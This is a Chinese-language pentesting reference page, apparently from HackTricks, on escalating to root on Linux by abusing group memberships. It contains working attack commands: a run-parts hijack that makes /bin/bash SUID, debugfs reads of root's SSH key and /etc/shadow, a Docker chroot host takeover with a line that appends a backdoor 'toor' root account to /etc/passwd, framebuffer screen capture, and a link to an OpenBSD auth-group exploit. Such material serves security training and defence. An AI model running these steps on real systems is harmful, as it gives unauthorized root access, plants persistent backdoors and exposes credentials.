# 有趣的组 - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin 组

### **PE - Method 1**

**有时**，**默认情况下（或因为某些软件需要）**在 **/etc/sudoers** 文件中你可能会发现如下几行：
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
这意味着 **任何属于 sudo 或 admin 组的用户都可以通过 sudo 执行任何操作**。

如果是这种情况，要 **成为 root 你只需执行**：
```
sudo su
```
### PE - 方法 2

查找所有 suid 二进制文件并检查是否存在二进制 **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
如果你发现二进制 **pkexec is a SUID binary** 并且你属于 **sudo** 或 **admin**，你可能可以用 `pkexec` 以 sudo 身份执行二进制。\
这是因为通常这些组包含在 **polkit policy** 中。该策略基本上用来识别哪些组可以使用 `pkexec`。检查它：
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
在那里你会发现哪些组被允许执行 **pkexec**，并且在某些 linux 发行版中**默认**会出现 **sudo** 和 **admin** 组。

要 **成为 root 你可以执行**：
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
如果你尝试执行 **pkexec** 并收到以下 **错误**：
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**这并非因为你没有权限，而是因为在没有 GUI 的情况下你未建立连接**。对此问题有一个变通方法，见： [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要 **2 个不同的 ssh 会话**：
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel 组

**有时**，**默认情况下**，在 **/etc/sudoers** 文件中你可以找到这一行：
```
%wheel	ALL=(ALL:ALL) ALL
```
这意味着 **属于 wheel 组的任何用户都可以以 sudo 的身份执行任何操作**。

如果是这种情况，要 **成为 root 你只需执行**：
```
sudo su
```
## Shadow 组

来自 **group shadow** 的用户可以 **读取** **/etc/shadow** 文件：
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
在排查 hashes 时关于锁定状态的快速说明：
- 包含 `!` 或 `*` 的条目通常在密码登录时为非交互式。
- `!hash` 通常表示密码已设置然后被锁定。
- `*` 通常表示从未设置过有效的密码 hash。
这对于账户分类即使在直接登录被阻止时也很有用。

## Staff 组

**staff**: Allows users to add local modifications to the system (`/usr/local`) without needing root privileges (note that executables in `/usr/local/bin` are in the PATH variable of any user, and they may "override" the executables in `/bin` and `/usr/bin` with the same name). Compare with group "adm", which is more related to monitoring/security. [\[source\]](https://wiki.debian.org/SystemGroups)

在 Debian 发行版中，`$PATH` 变量显示 `/usr/local/` 会以最高优先级运行，无论你是否为有特权的用户。
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
如果我们能劫持 `/usr/local` 下的一些程序，就可以很容易获得 root 权限。

劫持 `run-parts` 程序是获取 root 的一种简单方法，因为许多程序（例如 crontab、ssh 登录时）会运行类似 `run-parts` 的程序。
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
或者当新的 ssh 会话登录时。
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Exploit**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## 磁盘组

该权限几乎 **equivalent to root access**，因为你可以访问机器内的所有数据。

文件:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
注意，使用 debugfs 你也可以 **写文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，你可以这样做：
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
但是，如果你尝试 **写入由 root 拥有的文件**（例如 `/etc/shadow` 或 `/etc/passwd`），你会遇到一个 "**权限被拒绝**" 错误。

## 视频组

使用命令 `w`，你可以找到 **谁登录了系统**，并且它会显示如下输出：
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
**tty1** 表示用户 **yossi 已在机器的物理终端上登录**。

**video group** 有权限查看屏幕输出。基本上你可以观察屏幕内容。为此你需要以原始数据的形式 **抓取当前屏幕图像** 并获取屏幕正在使用的分辨率。屏幕数据可以保存到 `/dev/fb0`，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到此屏幕的分辨率。
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
要**打开**该**RAW 图像**，可以使用**GIMP**，选择**`screen.raw`**文件并将文件类型选择为**原始图像数据**：

![](<../../../images/image (463).png>)

然后将**Width**和**Height**修改为屏幕所使用的值，并查看不同的**Image Types**（并选择显示屏幕效果最好的那种）：

![](<../../../images/image (317).png>)

## Root Group

看起来默认情况下，**root 组的成员**可能可以访问并**修改**某些**服务**配置文件、某些**库文件**或其他**有趣的东西**，这些都可能被用于**提升权限**...

**检查 root 组成员可以修改的文件**：
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker 组

你可以 **将主机的根文件系统挂载到实例的卷上**，所以当实例启动时，它会立即在该卷中加载一个 `chroot`。这实际上会让你在该机器上获得 root 权限。
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to **run a privileged container and escape from it** as explained here:


{{#ref}}
../container-security/
{{#endref}}

If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../index.html#writable-docker-socket)**.**


{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}


{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd 组


{{#ref}}
./
{{#endref}}

## Adm 组

通常该组的 **成员**（**`adm`**）具有读取位于 _/var/log/_ 的 **日志** 文件的权限。\
因此，如果你已经入侵了该组中的某个用户，绝对应该去 **查看日志**。

## Backup / Operator / lp / Mail 组

这些组通常更像是用于凭证发现的向量，而不是直接的 root 提权向量：
- **backup**: 可能会暴露包含配置、密钥、DB 转储或令牌的归档。
- **operator**: 特定平台的运维访问，可能会 leak 敏感的运行时数据。
- **lp**: 打印队列/暂存区可能包含文档内容。
- **mail**: 邮件暂存可能暴露重置链接、OTP 以及内部凭证。

将这些组的成员身份视为高价值的数据暴露发现，并通过密码/令牌重用进行横向移动。

## Auth 组

在 OpenBSD 中，**auth** 组通常可以写入 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 这类目录（如果系统使用它们的话）。\
这些权限可能会被以下 exploit 滥用以 **escalate privileges** 到 root： [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{{#include ../../../banners/hacktricks-training.md}}
